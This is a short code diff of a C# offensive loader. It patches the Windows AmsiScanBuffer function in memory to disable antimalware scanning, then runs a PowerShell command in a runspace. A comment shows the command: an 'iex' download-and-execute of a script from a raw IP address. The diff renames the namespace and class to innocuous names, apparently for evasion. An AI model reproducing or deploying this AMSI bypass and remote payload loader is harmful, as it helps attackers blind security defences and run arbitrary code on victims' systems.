@@ -15,7 +15,7 @@ using System.Management.Automation.Runspaces;
 using System.Management.Automation;
 using System.Text;
 
-namespace AmsiScan
+namespace Gawdawpalin 
 {
     class Program
     {
@@ -29,16 +29,17 @@ namespace AmsiScan
             VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect); //Pointer changing the AmsiScanBuffer memory protection
             Marshal.Copy(ret, 0, asbAddress, ret.Length);
             VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);
-            Execution.MeMe();
+            Shwegugyi.MeMe();
 
         }
 
-        class Execution
+        class Shwegugyi 
 
         {
             //$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('https://54.18.24.199:7775/download/Bagan.ps1')"
             //[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
             public static string Command = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"Base64 Data"));
+            
             public static void MeMe()
             {
                 InitialSessionState p = InitialSessionState.CreateDefault();
